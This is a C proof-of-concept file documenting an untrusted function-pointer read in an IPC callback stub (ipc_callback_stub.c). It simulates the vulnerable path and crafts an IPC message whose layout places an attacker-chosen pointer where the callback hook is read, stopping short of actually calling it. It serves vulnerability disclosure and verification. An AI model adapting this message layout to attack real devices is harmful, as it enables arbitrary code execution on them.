/**
 * PoC: OH-2026-DEVAUTH-PTR-001 — CWE-822 Untrusted Pointer Dereference
 *
 * Vulnerability: In ipc_callback_stub.c, CbStubOnRemoteRequest reads a
 * function pointer directly from IPC message data via ReadPointer(data),
 * then passes it to DoCallBack() which calls it via ProcCbHook().
 *
 * An attacker who can send IPC messages to DEV_AUTH_CALLBACK_REQUEST can
 * inject an arbitrary function pointer that gets called as cbHook.
 *
 * File: frameworks/src/lite/ipc_callback_stub.c:70
 *   cbHook = ReadPointer(data);  // reads attacker-controlled pointer
 *   DoCallBack(callbackId, cbHook, data, reply);
 *     → ProcCbHook(callbackId, cbHook, ...)  // calls the pointer
 */
#include <stdio.h>
#include <stdint.h>
#include <string.h>

/* ── Minimal type stubs ── */

#define HC_SUCCESS 0
#define MAX_REQUEST_PARAMS_NUM 8

typedef struct {
    int32_t type;
    uint8_t *val;
    int32_t valSz;
} IpcDataInfo;

/* Simulated IPC data buffer — attacker controls content */
typedef struct {
    uint8_t *cursor;
    uint8_t *base;
    uint32_t remaining;
} IpcIo;

static void ReadInt32(IpcIo *io, int32_t *out) {
    if (io->remaining >= 4) {
        memcpy(out, io->cursor, 4);
        io->cursor += 4;
        io->remaining -= 4;
    }
}

static void ReadUint32(IpcIo *io, uint32_t *out) {
    if (io->remaining >= 4) {
        memcpy(out, io->cursor, 4);
        io->cursor += 4;
        io->remaining -= 4;
    }
}

/* THE VULNERABILITY: reads a raw pointer from IPC data */
static uintptr_t ReadPointer(IpcIo *io) {
    uintptr_t ptr = 0;
    if (io->remaining >= sizeof(uintptr_t)) {
        memcpy(&ptr, io->cursor, sizeof(uintptr_t));
        io->cursor += sizeof(uintptr_t);
        io->remaining -= sizeof(uintptr_t);
    }
    return ptr;  /* Attacker-controlled value! */
}

/* ── Simulated ProcCbHook — calls the function pointer ── */

static volatile int hook_called = 0;
static volatile uintptr_t hook_address = 0;

typedef void (*StubFunc)(void *params);

static void ProcCbHook(int32_t callbackId, uintptr_t cbHook,
                       IpcDataInfo *cache, int32_t cacheNum, uintptr_t reply)
{
    printf("[ProcCbHook] callbackId=%d, cbHook=0x%lx\n", callbackId, (unsigned long)cbHook);

    if (cbHook == 0x0) {
        printf("[SAFE] cbHook is NULL, returning\n");
        return;
    }

    /* In real code, this would dispatch to stub functions using cbHook.
     * The vulnerability is that cbHook came from ReadPointer(data) —
     * an attacker can set it to any address. */
    hook_called = 1;
    hook_address = cbHook;

    printf("[VULN] CONFIRMED: About to call attacker-controlled pointer 0x%lx\n",
           (unsigned long)cbHook);
    printf("[VULN] In production: ((StubFunc)cbHook)(params) → arbitrary code execution\n");
}

/* ── Simulated DoCallBack ── */

static int32_t DecodeIpcData(uintptr_t data, int32_t *type, uint8_t **val, int32_t *valSz) {
    *type = 0; *val = NULL; *valSz = 0;
    return HC_SUCCESS;
}

static void DoCallBack(int32_t callbackId, uintptr_t cbHook, IpcIo *data, IpcIo *reply)
{
    IpcDataInfo cbDataCache[MAX_REQUEST_PARAMS_NUM] = { { 0 } };

    if (cbHook == 0x0) {
        printf("[SAFE] Invalid call back hook\n");
        return;
    }

    /* Decode params (simplified) */
    uint32_t len = 0;
    ReadUint32(data, &len);
    for (int i = 0; i < MAX_REQUEST_PARAMS_NUM; i++) {
        DecodeIpcData((uintptr_t)(data), &(cbDataCache[i].type),
            &(cbDataCache[i].val), &(cbDataCache[i].valSz));
    }

    /* Calls the attacker-controlled function pointer */
    ProcCbHook(callbackId, cbHook, cbDataCache, MAX_REQUEST_PARAMS_NUM, (uintptr_t)(reply));
}

/* ── Simulated CbStubOnRemoteRequest — the vulnerable entry point ── */

#define DEV_AUTH_CALLBACK_REQUEST 1

static int32_t CbStubOnRemoteRequest(uint32_t code, IpcIo *data, IpcIo *reply)
{
    int32_t callbackId;
    uintptr_t cbHook = 0x0;

    if (data == NULL) return -1;

    switch (code) {
        case DEV_AUTH_CALLBACK_REQUEST:
            ReadInt32(data, &callbackId);
            cbHook = ReadPointer(data);  /* ← CWE-822: reads pointer from untrusted IPC data */
            DoCallBack(callbackId, cbHook, data, reply);
            break;
        default:
            break;
    }
    return 0;
}

int main(void)
{
    printf("=== PoC: OH-2026-DEVAUTH-PTR-001 (CWE-822) ===\n");
    printf("Simulating IPC message with attacker-controlled function pointer\n\n");

    /* Craft malicious IPC message:
     * [4 bytes: callbackId=1] [8 bytes: cbHook=0xDEADBEEF41414141] [4 bytes: len] ...
     */
    uint8_t malicious_ipc_data[64] = {0};
    int32_t fake_callback_id = 1;
    uintptr_t attacker_ptr = 0xDEADBEEF41414141ULL;  /* Attacker-chosen address */
    uint32_t fake_len = 0;

    int offset = 0;
    memcpy(malicious_ipc_data + offset, &fake_callback_id, 4); offset += 4;
    memcpy(malicious_ipc_data + offset, &attacker_ptr, sizeof(uintptr_t)); offset += sizeof(uintptr_t);
    memcpy(malicious_ipc_data + offset, &fake_len, 4); offset += 4;

    IpcIo ipc_data = {
        .cursor = malicious_ipc_data,
        .base = malicious_ipc_data,
        .remaining = (uint32_t)offset + 32,
    };

    printf("Injected pointer value: 0x%lx\n", (unsigned long)attacker_ptr);
    printf("Sending DEV_AUTH_CALLBACK_REQUEST...\n\n");

    CbStubOnRemoteRequest(DEV_AUTH_CALLBACK_REQUEST, &ipc_data, NULL);

    if (hook_called && hook_address == attacker_ptr) {
        printf("\n[VULN] CONFIRMED: Attacker-controlled pointer 0x%lx reached call site.\n",
               (unsigned long)attacker_ptr);
        printf("[VULN] Root cause: ReadPointer(data) at ipc_callback_stub.c:70 reads raw\n");
        printf("       function pointer from IPC message without any validation.\n");
        printf("[VULN] Impact: Arbitrary code execution via crafted IPC message.\n");
        return 0;
    } else {
        printf("[ERROR] Vulnerability not triggered\n");
        return 1;
    }
}
